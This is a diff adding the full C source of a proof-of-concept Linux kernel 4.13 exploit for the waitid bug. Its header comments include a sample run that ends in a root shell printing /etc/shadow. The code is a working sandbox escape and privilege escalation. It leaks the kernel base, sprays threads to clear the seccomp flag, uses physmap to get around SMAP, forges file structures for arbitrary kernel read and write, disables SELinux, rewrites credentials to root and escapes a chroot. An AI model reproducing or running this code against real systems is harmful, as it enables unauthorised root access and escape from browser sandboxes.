@@ -1,0 +1,1004 @@
+// Proof of concept exploit for waitid bug introduced in Linux Kernel 4.13
+// By Chris Salls  (twitter.com/chris_salls)
+// This exploit can be used to break out out of sandboxes such as that in google chrome
+// In this proof of concept we install the seccomp filter from chrome as well as a chroot,
+// then break out of those and get root
+// Bypasses smep and smap, but is somewhat unreliable and may crash the kernel instead
+// offsets written and tested on ubuntu 17.10-beta2
+/*
+salls@ubuntu:~/x$ uname -a
+Linux ubuntu 4.13.0-12-generic #13-Ubuntu SMP Sat Sep 23 03:40:16 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+salls@ubuntu:~/x$ gcc poc_smap_bypass.c -lpthread -o poc
+salls@ubuntu:~/x$ ./poc
+Installed sandboxes. Seccomp, chroot, uid namespace
+for spray assuming task struct size is 5952
+check in /sys/kernel/slab/task_struct/object_size to make sure this is right
+If it's wrong the exploit will fail
+found kernel base 0xffffffff87600000
+found mapping at 0xffff8eb500000000
+found mapping end at 0xffff8eb5a0000000
+9999 threads created
+found second mapping at 0xffff8eb600000000
+found second mapping end at 0xffff8eb750000000
+last_mapping is 0x150000000 bytes
+min guess ffff8eb650000000
+starting guessing
+this part can take up to a minute, or crash the machine :)
+found my task at 0xffff8eb67555dd00
+joining threads
+part 2 start
+mapped 0x100000000
+trying to find physmap mapping
+found mapping at 0xffff8eb500000000
+f213000 changed to 0
+page locked!
+detected change at 0xffff8eb658000000
+physmap addr is good
+here we go
+trying to call system...
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),118(lpadmin),128(sambashare),1000(salls)
+# head /etc/shadow
+root:!:17447:0:99999:7:::
+daemon:*:17435:0:99999:7:::
+*/
+
+/****** overview of exploit ********
+waitid uses unsafe_put_user without checking access_ok,
+allowing the user to give a kernel address for infop and write over kernel memory.
+when given invalid parameters this just writes the following 32 bit integers
+0, 0, 0, _, 0, 0, 0
+(the 4th element is unchanged)
+inside the chrome sandbox we cannot fork (can only make threads)
+so we can only give invalid parameters to waitid and only write 0's to kernel memory,
+
+To exploit this in the presence of smap:
+
+I start out by iteratively calling waitid until we find the kernel's base address
+When it's found it will not return efault error from the syscall
+
+Now, I can only write 0's at this point, so I spray 10000 threads and attempt
+to write 0's over the beginning of the task struct to unset the seccomp flag
+This part is kind of unreliable and depends on the size of the task struct which
+changes based on cpu.
+
+If it succceeds, I now know where the task struct is and no longer have seccomp
+By shifting the location of the write and using the pid of the child process, I
+can now write 5 consecutive arbitrary non-zero bytes. So I can create an address
+with this bitmask 0xffffffffff000000
+
+Now to create data at such an address I use the physmap, a mirror of all userland
+pages that exists in kernel memory. Mmap a large amount of memory, try writing at
+various places in the physmap until we see userland memory change. Then mlock that
+page.
+
+With controlled data in the kernel, I use the 5 byte write described above to change
+our task->files to point at the controlled page. This give me control of the file
+operations and arbitrary read/write.
+
+From here, I remove the chroot and edit my creds to make that thread root.
+*/
+
+
+
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <errno.h>
+#include <wait.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+#include <seccomp.h>
+#include <stdlib.h>
+#include <sys/prctl.h>
+#include <sys/types.h>
+#include <linux/filter.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <stdarg.h>
+#include <sys/mman.h>
+#include <sched.h>
+#include <pthread.h>
+#include <linux/sched.h>
+#include <linux/futex.h>
+#include <limits.h>
+#include <sys/ioctl.h>
+
+
+#define PR_SET_NO_NEW_PRIVS     38
+#define __NR_seccomp 317
+#define SECCOMP_SET_MODE_FILTER  1
+
+/************ task offsets *************/
+// from prctl_get_seccomp
+#define OFFSET_OF_SECCOMP_MODE 2920
+#define OFFSET_OF_SECCOMP 2928
+// from ptrace_access_vm
+#define OFFSET_OF_PARENT 2328
+// from sys_getcwd 
+#define OFFSET_OF_FS 2784
+// from __fget_light
+#define OFFSET_OF_FILES 2792
+// from 
+#define OFFSET_OF_NSPROXY 2800
+// from do_acct_process
+#define OFFSET_OF_SIGNAL 2808
+// from sys_getuid 
+#define OFFSET_OF_TASK_CRED 2720
+// from get_task_comm
+#define OFFSET_OF_COMM 2728
+// from __put_task_struct
+#define OFFSET_OF_TASK_USAGE 72
+// from keyctl_session_to_parent
+#define OFFSET_OF_THREAD_GROUP 2480
+
+
+/******* files offsets ********/
+// from fput
+#define OFFSET_OF_F_COUNT 56
+// from free_file_rcu
+#define OFFSET_OF_F_CRED 144
+// from file_alloc_security 
+#define OFFSET_OF_F_SECURITY 192
+// 
+#define OFFSET_OF_F_INODE 32
+
+/****** inode offsets *********/
+#define OFFSET_OF_IFLAGS 12
+
+// should assert nsproxy = files+8
+// and fs = files-8
+// since that's why we need to fix them up
+// nsproxy offsets
+#define OFFSET_OF_NS_COUNT 0
+// fs offset
+#define OFFSET_OF_FS_COUNT 0
+
+// cred offsets
+#define CRED_UID_OFF 4
+#define CRED_ID_SIZE 32
+#define CRED_CAP_OFF 40
+#define CRED_CAP_SIZE 40
+#define CRED_NS_OFF 136
+#define OFFSET_OF_CRED_SECURITY 120
+
+
+#define FMODE_LSEEK 4
+
+// global offsets
+#define KERNEL_BASE_DEFAULT 0xFFFFFFFF81000000
+// in cache_seq_next
+// mov rax, [rsi]; ret
+#define ARB_READ_GADGET_OFF (0xffffffff8109d2b2-KERNEL_BASE_DEFAULT)
+// in device_wakeup_attach_irq
+// mov [rdx], esi; ret
+#define ARB_WRITE_GADGET_OFF (0xffffffff810da932-KERNEL_BASE_DEFAULT)
+#define SELINUX_ENFORCING_OFF (0xffffffff824d1394-KERNEL_BASE_DEFAULT)
+#define INIT_USER_NS (0xffffffff81e508a0-KERNEL_BASE_DEFAULT)
+#define INIT_FS (0xffffffff81f23480-KERNEL_BASE_DEFAULT)
+
+// operations offsets in qwords
+#define OFFSET_LSEEK 1
+#define OFFSET_IOCTL 9
+
+// 4.13+
+
+// where read/write data is in kernel
+// had to play with last 3 nibbles to get it to not crash
+#define start_rw_off 0x9f5fe0
+
+// a global for the f_op in userspace
+unsigned long *f_op;
+
+struct PagePair {
+  unsigned long userland_page;
+  unsigned long kernel_page;
+};
+
+unsigned long kernel_base;
+void do_exploit_2(unsigned long task_addr);
+void get_physmap(struct PagePair *pp);
+
+// global for threads
+#define NUM_THREAD_SPRAY 10000
+pthread_t g_threads[NUM_THREAD_SPRAY];
+
+/********** HELPERS *************/
+void raw_input() {
+  int i;
+  printf("> ");
+  read(0, (char*)&i, 4);
+}
+
+
+int write_file(const char* file, const char* what, ...)
+{
+  char buf[1024];
+  va_list args;
+  va_start(args, what);
+  vsnprintf(buf, sizeof(buf), what, args);
+  va_end(args);
+  buf[sizeof(buf) - 1] = 0;
+  int len = strlen(buf);
+
+  int fd = open(file, O_WRONLY | O_CLOEXEC);
+  if (fd == -1) {
+    perror("open");
+    return 0;
+  }
+  if (write(fd, buf, len) != len) {
+    close(fd);
+    return 0;
+  }
+  close(fd);
+  return 1;
+}
+
+static inline void native_cpuid(unsigned int *eax, unsigned int *ebx,
+                                unsigned int *ecx, unsigned int *edx)
+{
+    /* ecx is often an input as well as an output. */
+    asm volatile("cpuid"
+        : "=a" (*eax),
+          "=b" (*ebx),
+          "=c" (*ecx),
+          "=d" (*edx)
+        : "0" (*eax), "2" (*ecx));
+}
+
+void install_mock_chrome_sandbox() {
+  char *buffer = NULL;
+  long length;
+  FILE *f = fopen ("chrome_seccomp_filter", "rb");
+
+  if (f)
+  {
+    fseek(f, 0, SEEK_END);
+    length = ftell (f);
+    fseek(f, 0, SEEK_SET);
+    buffer = malloc(length);
+    if (buffer)
+    {
+      fread(buffer, 1, length, f);
+    }
+    fclose(f);
+  }
+  else {
+    printf("couldn't open chrome_seccomp_filter\n");
+    exit(-1);
+  }
+  if (length%8 != 0) {
+    printf("length mod 8 != 0?\n");
+    exit(-1);
+  }
+  
+  // set up namespace
+  int real_uid = 1000;
+  int real_gid = 1000;
+  int has_newuser = 1;
+  if (unshare(CLONE_NEWUSER) != 0) {
+    perror("unshare(CLONE_NEWUSER)");
+    printf("no new user...\n");
+    has_newuser = 0;
+  }
+
+  if (unshare(CLONE_NEWNET) != 0) {
+    perror("unshare(CLONE_NEWUSER)");
+    exit(EXIT_FAILURE);
+  }
+
+  if (has_newuser && !write_file("/proc/self/setgroups", "deny")) {
+    perror("write_file(/proc/self/set_groups)");
+    exit(EXIT_FAILURE);
+  }
+  if (has_newuser && !write_file("/proc/self/uid_map", "1000 %d 1\n", real_uid)){
+    perror("write_file(/proc/self/uid_map)");
+    exit(EXIT_FAILURE);
+  }
+  if (has_newuser && !write_file("/proc/self/gid_map", "1000 %d 1\n", real_gid)) {
+    perror("write_file(/proc/self/gid_map)");
+    exit(EXIT_FAILURE);
+  }
+  
+  // chroot
+  if (chroot("/proc/self/fdinfo")) {
+    perror("chroot");
+    exit(EXIT_FAILURE);
+  }
+  // remove .?
+  // how did they remove that dir..
+    
+  // set uid
+  if (!has_newuser){
+    if (setgid(1000)) {
+      perror("setgid");
+      exit(EXIT_FAILURE);
+    }
+    if (setuid(1000)) {
+      perror("setuid");
+      exit(EXIT_FAILURE);
+    }
+  }
+  
+  // no new privs
+  int res = prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
+  if (res) {
+    printf("no new privs failed? %d\n", res);
+  }
+
+  // filter
+  struct sock_fprog prog = {
+     .len = (unsigned short) (length/8),
+     .filter = (void*)buffer,
+  };
+
+  // install filter
+  if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog)) {
+     perror("seccomp");
+     exit(-2);
+  }
+  printf("Installed sandboxes. Seccomp, chroot, uid namespace\n");
+}
+
+// futex wrapper
+static int futex(void *uaddr, int futex_op, int val, 
+                 const struct timespec *timeout, int *uaddr2, int val3) {
+  return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr, val3);
+}
+
+
+/***********EXPLOIT CODE************/
+
+pthread_attr_t thread_attr;
+
+unsigned long get_base() {
+  // first we try doing our arb write to find the system base address
+  // if syscall is 0 we didn't fault
+  unsigned long start = 0xffffffff00000000;
+  unsigned long inc =   0x0000000000100000;
+  unsigned long guess = start;
+  while (guess != 0) {
+    int res = syscall(SYS_waitid, P_ALL, 0, guess+start_rw_off, WEXITED, NULL);
+    if (errno != 14) {
+      printf("found kernel base 0x%lx\n", guess);
+      kernel_base = guess;
+      return guess;
+    }
+    
+    guess += inc;
+  }
+  printf("failed to find base address...");
+  return -1;
+}
+
+int threads_run;
+int barrier2;
+int barrier1;
+unsigned long g_addr_guess;
+unsigned long mapping_begin;
+unsigned long mapping_end;
+
+int found_one = 0;
+void *thread_guy(void *arg) {
+  // this thread continuously checks if the seccomp filter was removed
+  // if so we can move onto the part 2 of the exploit
+  // we check if the spray worked before and after each barrier
+  while (1) {
+    
+    if (found_one) {
+      syscall(SYS_exit, 0);
+    }
+    // wait on barrier1
+    int res = futex(&barrier1, FUTEX_WAIT, 0, NULL, NULL, 0);
+    if (found_one) {
+      syscall(SYS_exit, 0);
+    }
+    
+    long curr_addr = g_addr_guess;
+    __atomic_fetch_add(&threads_run, 1, __ATOMIC_SEQ_CST);
+  
+    // check if opening /dev/random does not return the error code from seccomp
+    // it will still fail because of the chroot, but have a different error
+    int fd = open("/dev/random", O_RDONLY);
+    if (errno != 1) {
+      // FOUND
+      printf("found my task at 0x%lx\n", curr_addr);
+      found_one = 1;
+      do_exploit_2(curr_addr);
+      return NULL;
+    }
+    
+    // wait for barrier 2
+    if (found_one) {
+      syscall(SYS_exit, 0);
+    }
+    futex(&barrier2, FUTEX_WAIT, 0, NULL, NULL, 0);
+    if (found_one) {
+      syscall(SYS_exit, 0);
+    }
+    __atomic_fetch_add(&threads_run, 1, __ATOMIC_SEQ_CST);
+  }
+}
+
+int num_threads = 0;
+long spray_offset;
+void unseccomp() {
+  // first we spin up a lot of threads
+  // let's try 10k
+  // and then we try overwriting the TIF_SECCOMP flag in the task struct
+  int i;
+
+  unsigned long curr_guess = 0xffff800000000000;
+  int j;
+  while(1) {
+    // try writing
+    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
+    if (errno != 14) {
+      mapping_begin = curr_guess;
+      printf("found mapping at %p\n", (void*)curr_guess);
+      break;
+    }
+    curr_guess += 0x10000000;
+  }
+  // check if mapping extends higher?
+  while(1) {
+    curr_guess += 0x10000000;
+    // try writing
+    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
+    if (errno == 14) {
+      printf("found mapping end at %p\n", (void*)curr_guess);
+      mapping_end = curr_guess;
+      curr_guess -= 0x10000000;
+      break;
+    }
+  }
+  
+  
+  // start threads
+  barrier1 = 0;
+  barrier2 = 0;
+  for (i = 0; i < NUM_THREAD_SPRAY; i++) {
+    num_threads = i;
+    if(pthread_create(&g_threads[i], &thread_attr, thread_guy, NULL)) {
+      printf("pthread create error\n");
+      printf("%d\n", i);
+      break;
+    }
+  }
+  printf("%d threads created\n", num_threads);
+  
+  /***** find the kernel heap *******/
+  unsigned long last_mapping_start;
+  unsigned long last_mapping_end;
+  
+  unsigned long second_mapping;
+  unsigned long second_mapping_end;
+  usleep(100000);
+  while(1) {
+    curr_guess += 0x10000000;
+    // try writing
+    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
+    if (errno != 14) {
+      printf("found second mapping at %p\n", (void*)curr_guess);
+      //mapping_end = curr_guess;
+      second_mapping = curr_guess;
+      last_mapping_start = second_mapping;
+      curr_guess -= 0x10000000;
+      break;
+    }
+  }
+  while(1) {
+    curr_guess += 0x10000000;
+    // try writing
+    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
+    if (errno == 14) {
+      printf("found second mapping end at %p\n", (void*)curr_guess);
+      second_mapping_end = curr_guess;
+      last_mapping_end = second_mapping_end;
+      curr_guess -= 0x10000000;
+      break;
+    }
+  }
+
+
+  unsigned long third_mapping = 0;
+  unsigned long third_mapping_end;
+  usleep(100000);
+  while(curr_guess < second_mapping_end+0x100000000) {
+    curr_guess += 0x10000000;
+    // try writing
+    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
+    if (errno != 14) {
+      printf("found third mapping at %p\n", (void*)curr_guess);
+      third_mapping = curr_guess;
+      last_mapping_start = third_mapping;
+      curr_guess -= 0x10000000;
+      break;
+    }
+  }
+  if (third_mapping) {
+    while(1) {
+      curr_guess += 0x10000000;
+      // try writing
+      int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
+      if (errno == 14) {
+        printf("found third mapping end at %p\n", (void*)curr_guess);
+        third_mapping_end = curr_guess;
+        last_mapping_end = third_mapping_end;
+        curr_guess -= 0x10000000;
+        break;
+      }
+    }
+  }
+  /***** done finding the kernel heap *******/
+  
+  /****** start overwriting from low addresses to high and hope we unset the seccomp flag ******/
+  // some start guess found by experimenting, could be very wrong on some systems
+  curr_guess = last_mapping_end-0x100000000;
+  printf("last_mapping is 0x%lx bytes\n", last_mapping_end-last_mapping_start);
+  printf("min guess %lx\n", curr_guess);
+  printf("starting guessing\n");
+  printf("this part can take up to a minute, or crash the machine :)\n");
+  i = 0;
+  while(!found_one) {
+    curr_guess += 0x800000;
+    unsigned long guess_val = curr_guess + spray_offset;
+    // try writing
+    syscall(SYS_waitid, P_ALL, 0, guess_val-26, WEXITED, NULL);
+    g_addr_guess = guess_val;
+    // let the threads check
+    barrier2 = 0;
+    threads_run = 0;
+    barrier1 = 1;
+    futex(&barrier1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
+    while(threads_run < num_threads) {
+      if (found_one) {
+        // one of the threads is free from seccomp
+        // wake from barriers first
+        barrier1=1;
+        barrier2=1;
+        futex(&barrier1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
+        futex(&barrier2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
+        printf("joining threads\n");
+        for(i = 0; i < num_threads; i++) {
+          pthread_join(g_threads[i], NULL);
+        }
+        printf("done joining threads\n");        
+        
+        sleep(1000);
+      }
+      usleep(10000);
+    }
+    
+    // make sure threads are reset
+    barrier2 = 1;
+    barrier1 = 0;
+    futex(&barrier2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
+    while(threads_run < num_threads*2) {
+      if (found_one) {
+        printf("apparently we found one sleep forever\n");
+        // wake from barriers first
+        barrier1=1;
+        barrier2=1;
+        futex(&barrier1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
+        futex(&barrier2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
+        printf("joining threads\n");
+        for(i = 0; i < num_threads; i++) {
+          pthread_join(g_threads[i], NULL);
+        }
+        printf("done joining threads\n");    
+        sleep(100000);
+      }
+      usleep(10000);
+    }
+    threads_run = 0;
+    barrier2 = 0;
+    i += 1;  
+  }
+}
+
+int just_exit(void *arg) {
+  return 0;
+}
+
+int done_overwrite;
+long new_stack[10000];
+void write_5(unsigned long addr, unsigned long val) {
+  // uses waitid with pid to write a 5 byte value
+  // clobbers a lot of adjacent memory, mostly with 0's
+  long fake_info[20];
+  
+  if(val & 0xffffff) {
+    printf("cannot write that val\n");
+    exit(-1);
+  }
+  
+  //fork exit until pid is good
+  int i = 0;
+  for(i = 3; i < 8; i++) {
+    int to_write = (val >> (8*i)) & 0xff;
+    while(1) {
+      // get pid ending in to_write
+      //int pid = fork();
+      // to make super fast we clone VM instead of regular fork
+      // int pid = syscall(SYS_clone, CLONE_VM | CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD, &new_stack[200], NULL, 0, 0);
+      int pid = clone(just_exit, &new_stack[5000], CLONE_VM | SIGCHLD, NULL);
+      if (!pid) {
+        exit(0);
+      }
+      if ((pid & 0xff) == to_write) {
+        syscall(SYS_waitid, P_PID, pid, addr-16+i, WEXITED, NULL);
+        break;
+      }
+      else {
+        syscall(SYS_waitid, P_PID, pid, fake_info, WEXITED, NULL);
+      }
+    }
+  }
+  
+}
+
+// functions for once we control ops
+unsigned long read_addr(unsigned long addr) {
+  f_op[OFFSET_LSEEK] = ARB_READ_GADGET_OFF + kernel_base;
+  return syscall(SYS_lseek, 0, addr, SEEK_SET);
+}
+
+void mem_read(unsigned long addr, void *buf, unsigned long bytes) {
+  unsigned long i = 0;
+  char *cbuf = (char*)buf;
+  for(i = 0; i < bytes; i+= 8) {
+    unsigned long got = read_addr(addr+i);
+    if (i+8 > bytes) {
+      unsigned long j = 0;
+      for(j = i; j < bytes; j++) {
+        cbuf[j] = (char)got&0xff;
+        got >>= 8;
+      }
+    }
+    else {
+      *(long*)(cbuf+i) = got;
+    }
+  }
+}
+
+void write_addr4(unsigned long addr, unsigned int val) {
+  f_op[OFFSET_IOCTL] = ARB_WRITE_GADGET_OFF+kernel_base;
+  ioctl(0, val, addr);
+}
+
+void write_addr(unsigned long addr, unsigned long val) {
+  write_addr4(addr, (unsigned int)val);
+  write_addr4(addr+4, (unsigned int)(val>>32));  
+}
+
+void mem_write(unsigned long addr, void *buf, unsigned long bytes) {
+  if (bytes < 4 || bytes % 4 != 0) {
+    //cannot write less than 4 bytes
+    printf("Invalid write size\n");
+    exit(-1);
+  }
+  int i = 0;
+  char *cbuf = buf;
+  for(i = 0; i < bytes; i+=4) {
+    write_addr4(addr+i, *(unsigned int*)(cbuf+i));
+  }
+}
+
+
+void *write_5_thread(void *arg) {
+  // constantly write to pages to keep them dirtly and "mlock" them
+  unsigned long *aa = arg;
+  unsigned long addr = aa[0];
+  unsigned long data = aa[1];
+  write_5(addr, data);
+  done_overwrite = 1;
+}
+
+int done_rooting;
+void *thread_to_be_root(void *arg) {
+  // this guy exists for copying data and becoming root
+  while(!done_rooting) {
+    usleep(10000);
+  }
+  printf("trying to call system...\n");
+  system("/bin/sh");
+}
+
+void do_exploit_2(unsigned long task_addr) {
+  // second part of the exploit
+  // now that we don't have seccomp we can fork and use waitid to write up to 5 non-NULL bytes
+  // I map a large section of memory and search for it in the physmap to find an address with 3 NULL bytes
+  // The physmap allows us to control data from userland and bypass smap
+
+  // sleep for a bit to make sure threads exit
+  usleep(100000);
+
+  // remove seccomp filter
+  syscall(SYS_waitid, P_ALL, 0, task_addr + OFFSET_OF_SECCOMP-4, WEXITED, NULL);  
+  syscall(SYS_waitid, P_ALL, 0, task_addr + OFFSET_OF_SECCOMP_MODE, WEXITED, NULL);
+  // verify seccomp removed for child
+  int pid = fork();
+  int rand_fd = open("/dev/random", O_RDONLY); // this will fail due to chroot
+  
+  if (errno == 1) {
+    printf("SECCOMP NOT ACTUALLY GONE!\n");
+    exit(-1);
+  }
+  if (!pid) {
+    exit(0);
+  }
+  
+  printf("part 2 start\n");
+  // First, get a physmap address in the kernel land
+  struct PagePair pp;
+  get_physmap(&pp);
+  
+  // now we have a physmap address that we know, we can create our fake files
+  // we will set up fake files struct
+  memset((void*)pp.userland_page, 0x41, 0x1000);
+  unsigned long files_struct = pp.userland_page;
+  *(int*)files_struct = 100; // count (make sure it's never freed)
+  *(unsigned long*)(files_struct+32) = pp.kernel_page+0x100; // fdt
+  
+  // set up fdt
+  unsigned long fdt = pp.userland_page+0x100;
+  *(int*)fdt = 2; // num_files
+  *(unsigned long*)(fdt+8) = pp.kernel_page+0x200; // fd[] 
+  
+  // set up fd[]
+  unsigned long fdarr = pp.userland_page+0x200;
+  *(unsigned long*)fdarr = pp.kernel_page+0x300; // fd[0]
+  
+  // set up file struct
+  unsigned long file = pp.userland_page+0x300;
+  *(unsigned long*)(file+40) = pp.kernel_page+0x400; // f_op
+  *(unsigned int*)(file+68) = FMODE_LSEEK; // mode
+  *(unsigned long*)(file+OFFSET_OF_F_COUNT)=100; // never free me
+
+  f_op = (unsigned long*)(pp.userland_page+0x400); // f_op pointer
+
+  // need to set up IS_PRIVATE(inode)) and file->cred = task->cred to pass checks for ioctl
+  // this is the IS_PRIVATE(inode)
+  *(unsigned long*)(file+OFFSET_OF_F_INODE)=pp.kernel_page+0x500; // inode
+  unsigned long inode = (unsigned long)(pp.userland_page+0x500); // inode
+  *(unsigned int*)(inode+OFFSET_OF_IFLAGS) = 0x200; // IS_PRIVATE
+  
+  // write over files pointer in task struct
+  // will overwrite signal nsproxy and fs, so we will need to fix it
+  printf("here we go\n");
+  done_overwrite=0;
+  long aa[2];
+  aa[0] = task_addr + OFFSET_OF_FILES;
+  aa[1] = pp.kernel_page;
+  pthread_t th1;
+  // create the thread we will make root
+  done_rooting = 0;
+  if(pthread_create(&th1, NULL, thread_to_be_root, NULL)) {
+    printf("pthread failed\n");
+    exit(-1);
+  }
+  
+  // create a thread to overwrite the files in our task
+  // this current thread can't do that because the signal will be corrupted
+  if(pthread_create(&th1, NULL, write_5_thread, aa)) {
+    printf("pthread failed\n");
+    exit(-1);
+  }
+
+  // wait for the thread to overwrite my files
+  while(!done_overwrite) {
+  }
+   
+  // I'll use lseek here to do arbitrary reads
+
+  // need to set up IS_PRIVATE(inode)) and file->security = task->cred->security to pass checks for ioctl  
+  // first fix up structures in FILE
+  // let's check another file
+  // leak out addr of parent
+  unsigned long parent_addr = read_addr(task_addr+OFFSET_OF_PARENT);
+  
+  // grab security from task cred
+  unsigned long cred = read_addr(task_addr + OFFSET_OF_TASK_CRED);
+  unsigned long security = read_addr(cred + OFFSET_OF_CRED_SECURITY);
+  
+  // fix up file->security
+  *(unsigned long*)(file+OFFSET_OF_F_SECURITY) = security;
+
+  // now have arb write through ioctl!
+    
+  // okay first fix up task struct
+  // copy parent's nsproxy and set it's refcount high
+  long parent_nsproxy = read_addr(parent_addr+OFFSET_OF_NSPROXY);
+  write_addr(task_addr+OFFSET_OF_NSPROXY, parent_nsproxy);
+  write_addr4(parent_nsproxy+OFFSET_OF_NS_COUNT, 0x11111111);
+  
+  // copy parent's fs and set it's refcount high
+  long parent_fs = read_addr(parent_addr+OFFSET_OF_FS);
+  write_addr(task_addr+OFFSET_OF_FS, parent_fs);
+  write_addr4(parent_fs+OFFSET_OF_FS_COUNT, 0x11111111);
+  
+  // now set tasks refcount high, we don't want to free it ever either?
+  write_addr4(task_addr+OFFSET_OF_TASK_USAGE, 0x11111);
+  
+  // GET ROOT
+  // disable selinux enforcing
+  write_addr4(kernel_base+SELINUX_ENFORCING_OFF, 0);
+  
+  unsigned long thread2 = read_addr(task_addr+OFFSET_OF_THREAD_GROUP)-OFFSET_OF_THREAD_GROUP;
+  if (thread2 == task_addr) {
+    thread2 = read_addr(task_addr+OFFSET_OF_THREAD_GROUP+8)-OFFSET_OF_THREAD_GROUP;
+  }
+
+  unsigned long signal = read_addr(thread2+OFFSET_OF_SIGNAL);
+  write_addr(task_addr+OFFSET_OF_SIGNAL, signal);
+  // should be able to ptrace now (it's a decent test to make sure signal is fixed
+  
+  // now fix up cred we want root
+  char buf[100];
+  memset(buf, 0, sizeof(buf));
+  mem_write(cred+CRED_UID_OFF, buf, CRED_ID_SIZE);
+  memset(buf, 0xff, sizeof(buf));
+  mem_write(cred+CRED_CAP_OFF, buf, CRED_CAP_SIZE);
+  unsigned long init_ns = INIT_USER_NS+kernel_base;
+  mem_write(cred+CRED_NS_OFF, &init_ns, 8); // is this okay
+
+  // now we need to just escape the file system sandbox (chroot)
+  unsigned long init_fs = INIT_FS+kernel_base;
+  write_addr(thread2+OFFSET_OF_FS, init_fs);
+  // WE ARE DONE!
+  // signal to the other thread and sleep forever
+  done_rooting = 1;
+  sleep(1000000);
+
+}
+
+/***** physmap code ******/
+int done_locking;
+char *mapping_base;
+void *mlock_thread(void *arg) {
+  // constantly write to pages to keep them dirtly and "mlock" them
+  long i;
+  char last_val = 0;
+  while(!done_locking) {
+    last_val += 1;
+    for(i = 0xfff; i < 0x10000000; i+= 0x1000) {
+      mapping_base[i] = last_val;
+    }
+  }
+}
+
+void* mapping_changed() {
+  long i = 0;
+  for(i = 0; i < 0x10000000; i+= 0x1000) {
+    if (mapping_base[i] != 0x41) {
+      printf("%lx changed to %d\n", i, mapping_base[i]);
+      // lock that page in
+      if(mlock(&mapping_base[i], 0x1000)) {
+        perror("mlock");
+      }
+      printf("page locked!\n");
+      return &mapping_base[i];
+    }
+  }
+  return 0;
+}
+
+void get_physmap(struct PagePair *pp) {
+  // mmap a large amount of memory
+  // have one thread watch for changes, while we try overwriting it in the kernel's physmap
+  // lock the page in when it's found
+  unsigned long base = 0x100000000;
+  mapping_base = (char*)base;
+  
+  long* a = mmap((void*)base, 0x10000000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
+  if ((long)a == -1) {
+    printf("mmap failed\n");
+    perror("mmap");
+    exit(-1);
+  }
+  printf("mapped %p\n", a);
+  memset(a, 0x41, 0x10000000);
+
+  done_locking = 0;
+  int j = 0;
+  for(j = 0; j < 4; j++) {
+    pthread_t th1;
+    if(pthread_create(&th1, NULL, mlock_thread, NULL)) {
+      printf("mlock thread create error\n");
+      exit(0);
+    }
+  }
+
+  // try to find it in physmap
+  unsigned long curr_guess = mapping_begin-0x80000000;
+  printf("trying to find physmap mapping\n");
+  while(1) {
+    // try writing
+    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
+    if (errno != 14) {
+      printf("found mapping at %p\n", (void*)curr_guess);
+      curr_guess += 0x80000000;
+      break;
+    }
+    curr_guess += 0x10000000;
+  }
+  // try to find physmap
+  long *locked_mapping = NULL;
+  long *locked_kernel_mapping = NULL;
+  while(1) {
+    // this has 6 0's to ensure that we end up with an address containing only 5 non-zero vals
+    curr_guess += 0x1000000;
+    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess, WEXITED, NULL);
+    if (locked_mapping = mapping_changed()) {
+      locked_kernel_mapping = (long*)curr_guess;
+      printf("detected change at %p\n", (void*)curr_guess);
+      break;
+    }
+  }
+  
+  // verify lock worked
+  locked_mapping[0] = 0x41414141;
+  syscall(SYS_waitid, P_ALL, 0, locked_kernel_mapping, WEXITED, NULL);
+  syscall(SYS_waitid, P_ALL, 0, &locked_kernel_mapping[100], WEXITED, NULL);
+  if (locked_mapping[0] != 0 || locked_mapping[100] != 0) {
+    printf("second write didn't work...");
+  }
+  printf("physmap addr is good\n");
+  if(pp) {
+    pp->userland_page = (unsigned long)locked_mapping;
+    pp->kernel_page = (unsigned long)locked_kernel_mapping;
+  }
+  done_locking = 1;
+
+}
+
+int main() {
+
+  install_mock_chrome_sandbox();
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  srand(time(NULL));
+
+  // set thread size smaller
+  pthread_attr_init(&thread_attr);
+  if(pthread_attr_setstacksize(&thread_attr, 0x10000)) {
+    printf("set stack size error\n");
+    return 0;
+  }
+
+  // get cpuid info so we know size of task_struct
+  int eax,ebx,ecx,edx;
+  eax=0xd;
+  ebx = ecx = edx = 0;
+  native_cpuid(&eax, &ebx, &ecx, &edx);
+  int xsave_size = ebx;
+
+  if(xsave_size == 0x340) {
+    spray_offset = 0x55dd00;
+    printf("for spray assuming task struct size is 5952\n");
+  }
+  else if(xsave_size == 0x440) {
+    spray_offset = 0x5448c0;
+    printf("for spray assuming task struct size is 6208\n");
+  }
+  else {
+    printf("unknown xsave size... exiting since I don't know have the offsets hardcoded for that task save\n");
+    return 0;
+  }
+  printf("check in /sys/kernel/slab/task_struct/object_size to make sure this is right\n");
+  printf("If it's wrong the exploit will fail\n");
+
+  unsigned long base = get_base();
+  if (base == -1) {
+    return -1;
+  }
+
+  unseccomp();
+  return 0;
+
+}
